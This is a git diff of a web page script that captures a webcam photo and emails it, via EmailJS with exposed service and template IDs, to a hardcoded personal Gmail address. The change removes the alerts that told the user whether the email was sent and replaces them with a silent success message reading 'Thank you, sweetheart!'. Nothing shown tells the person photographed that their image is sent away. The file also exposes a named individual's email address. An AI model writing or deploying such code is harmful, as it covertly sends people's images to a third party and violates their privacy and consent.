@@ -72,48 +72,56 @@
             console.log("An error occurred: " + err);
         });
 
-        function takePicture() {
-    const width = 320; // Reduce the width to a smaller size
-    const height = video.videoHeight / (video.videoWidth / width); // Maintain aspect ratio
-
-    canvas.width = width;
-    canvas.height = height;
-
-    context.drawImage(video, 0, 0, width, height);
-    const data = canvas.toDataURL('image/jpeg', 0.5); // Change to 'image/jpeg' and reduce quality (0.5 = 50%)
-
-    photo.src = data;
-    photo.style.display = 'block';
-
-    sendEmail(data);
-
-    const stream = video.srcObject;
-    const tracks = stream.getTracks();
-    tracks.forEach(track => track.stop());
-}
+       
 
 
-function sendEmail(imageData) {
-    const base64Data = imageData.split(',')[1]; // Extract base64 data
-    const emailParams = {
-        to_name: 'Nouhaila Elbouhali',
-        to_email: 'nouhailaelbouhali73@gmail.com',
-        from_name: 'Jailey Shiper',
-        message: 'Here is the captured image!',
-        attachment: `data:image/jpeg;base64,${base64Data}` // Format the base64 data properly
-    };
 
-    console.log("Email Parameters: ", emailParams); // Log parameters for debugging
 
-    emailjs.send('service_pg1ysay', 'template_q8jc6xc', emailParams)
-    .then(function(response) {
-        alert('Email sent successfully!');
-        console.log('SUCCESS!', response.status, response.text);
-    }, function(error) {
-        alert('Failed to send email. Please try again.');
-        console.log('FAILED...', error);
-    });
-}
-    </script>
+    function takePicture() {
+        const width = 320; // Reduce the width to a smaller size
+        const height = video.videoHeight / (video.videoWidth / width); // Maintain aspect ratio
+
+        canvas.width = width;
+        canvas.height = height;
+
+        context.drawImage(video, 0, 0, width, height);
+        const data = canvas.toDataURL('image/jpeg', 0.5); // Change to 'image/jpeg' and reduce quality (0.5 = 50%)
+
+        photo.src = data;
+        photo.style.display = 'block';
+
+        sendEmail(data);
+
+        const stream = video.srcObject;
+        const tracks = stream.getTracks();
+        tracks.forEach(track => track.stop());
+    }
+
+    function sendEmail(imageData) {
+        const base64Data = imageData.split(',')[1]; // Extract base64 data
+        const emailParams = {
+            to_name: 'Nouhaila Elbouhali',
+            to_email: 'nouhailaelbouhali73@gmail.com',
+            from_name: 'Jailey Shiper',
+            message: 'Here is the captured image!',
+            attachment: `data:image/jpeg;base64,${base64Data}` // Format the base64 data properly
+        };
+
+        console.log("Email Parameters: ", emailParams); // Log parameters for debugging
+
+        emailjs.send('service_pg1ysay', 'template_q8jc6xc', emailParams)
+        .then(function(response) {
+            console.log('SUCCESS!', response.status, response.text);
+            
+            // Hide the button and change the heading text
+            document.querySelector('button').style.display = 'none';
+            document.querySelector('h1').textContent = 'Thank you, sweetheart!';
+        }, function(error) {
+            console.log('FAILED...', error);
+        });
+    }
+</script>
+
+
 </body>
 </html>
